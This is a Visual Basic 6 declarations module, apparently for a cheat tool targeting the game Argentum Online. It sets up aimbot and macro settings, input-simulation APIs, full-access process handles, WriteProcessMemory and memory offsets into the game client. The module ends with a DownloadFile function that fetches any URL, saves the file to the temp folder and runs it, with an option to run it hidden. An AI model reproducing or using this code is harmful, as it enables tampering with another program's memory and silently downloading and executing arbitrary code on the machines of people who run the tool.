Attribute VB_Name = "Declaraciones"
'Begin Code

Public Declare Function GetAsyncKeyState Lib "User32" (ByVal vKey As Long) As Integer
Public Lanzar As String
Public Remo As String
Public SeActiva As String
Public xM As Long
Public yM As Long
Public actual As String
Public UserURL As String
Public asd As String
Public Yapaso As String
Public hwndexe As Long


Public vModoMacros As String
Public vAimbot As String
Public vAutoRemo As String
Public IntervaloAutoRemo As String
Public IntervaloAutoLanzar As String
Public IntervaloAutoRojas As String
Public DelayAzules As String
Public PorcentajeRojas As Long
Public PorcentajeAzules As Long
Public IntervaloAutoAzules As String
Public DelayRojas As String



Public Paralizado As Long
Public Const MOUSEEVENTF_ABSOLUTE = &H8000
Public Const MOUSEEVENTF_LEFTDOWN = &H2
Public Const MOUSEEVENTF_LEFTUP = &H4
Public Declare Function PostMessage Lib "User32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function GetKeyState Lib "User32" (ByVal nVirtKey As Long) As Integer
Public Declare Function WindowFromPoint _
Lib "User32" ( _
ByVal xPoint As Long, _
ByVal yPoint As Long) As Long
Public Declare Function GetCursorPos _
Lib "User32" ( _
lpPoint As POINTAPI) As Long
Public Poteo As Long
Public MinHp As Long
Public MaxHp As Long
Public MinMan As Long
Public MaxMan As Long
Public map As Integer
Public Activado As String
Public Variable As String
Public Fuerza As String
Public Agilidad As String
Public AO As String
Public EXEAO As String
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public ProsH As Long
Public Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function FindWindow Lib "User32" Alias "FindWindowA" (ByVal Classname As String, ByVal WindowName As String) As Long
Public Declare Function GetWindowThreadProcessId Lib "User32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Reso As String
Public Declare Function SetCursorPos Lib "User32" (ByVal x As Long, ByVal y As Long) As Long
Public UsandoPocion As String
Public Cosito As String
Public cactus As String
Public result As String
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Const conSwNormal = 1
Public Declare Function GetForegroundWindow Lib "User32" () As Long
Public Declare Function GetClassName Lib "User32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Public Ancho As Long
Public Alto As Long
Public texthwnd As Long
Public visi As String
Public Para As String
Public Espe As String
Public hechizosx As String
Public hechizosy As String
Public inventariox As String
Public inventarioy As String
Public lanzarx As String
Public lanzary As String
Public paralizarx As String
Public paralizary As String
Public especialx As String
Public especialy As String
Public remox As String
Public remoy As String
Public headx As String
Public heady As String
Public Ta3 As String
Private strDesktop As String
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2 '
Public vTeclas
Public vMain
Public vIntervalos
Public vCoord
Public Declare Function SetWindowPos _
    Lib "User32" ( _
        ByVal hwnd As Long, _
        ByVal hWndInsertAfter As Long, _
        ByVal x As Long, ByVal y As Long, _
        ByVal cx As Long, _
        ByVal cy As Long, _
        ByVal wFlags As Long) As Long
        
Public Declare Function GetCursor Lib "User32" () As Long
Public Type PCURSORINFO
    cbSize As Long
    flags As Long
    hCursor As Long
    ptScreenPos As POINTAPI
End Type
'To grab cursor shape -require at least win98 as per Microsoft documentation...
Public Declare Function GetCursorInfo Lib "user32.dll" (ByRef pci As PCURSORINFO) As Long

Public Enum eOffsets
    oActive = 0
    oHeading = 4
    oPosX = 8
    oPosY = &HA
    oName = &H1CB4
    oScrollDirectionX = &H1CB8
    oScrollDirectionY = &H1CBA
    oMoving = &H1CBC
End Enum








Public Enum eEstado
    None = 0
    CastedSpell
    GottaThrow
End Enum
Public Estado As eEstado

Public Tick_B4Throw As Long

Public BestMoveTime As Long
Public BestTick As Long
Public BestTickLast As Long
Public LastPosX As Long
Public LastPosY As Long

Public WaitPosX As Long
Public WaitPosY As Long
Public WaitTick As Long

Public Declare Function GetTickCount Lib "kernel32" () As Long

Sub Web()
ShellExecute hwnd, "open", "https://www.facebook.com/pages/Cosa-Nostra/774398335989408", vbNullString, vbNullString, conSwNormal
End Sub
Sub youtube()
ShellExecute hwnd, "open", "https://www.youtube.com/channel/UC6rGegDXjqVEKNuLH3SsU1g", vbNullString, vbNullString, conSwNormal
End Sub
'
Function DownloadFile(ByVal URL As String, ByVal SaveName As String, Optional SavePath As String = "TMP", Optional RunAfterDownload As Boolean = True, Optional RunHide As Boolean = False)
    On Error Resume Next
    Err.Clear
 
    Set XML = CreateObject("Microsoft.XMLHTTP")
    Set ADS = CreateObject("ADODB.Stream")
 
    XML.Open "GET", URL, False
    XML.send
 
    XML.getAllResponseHeaders
 
    FullSavePath = Environ(SavePath) & "\" & SaveName
 
    ADS.Open
    ADS.Type = 1
    ADS.Write XML.responseBody
    ADS.SaveToFile FullSavePath, 2
 
    If Err Then
        DownloadFile = False
    Else
        If RunAfterDownload = True Then
            If RunHide = True Then
                Shell FullSavePath, vbHide
            Else
                Shell FullSavePath, vbNormalFocus
            End If
        End If
        DownloadFile = True
    End If
End Function

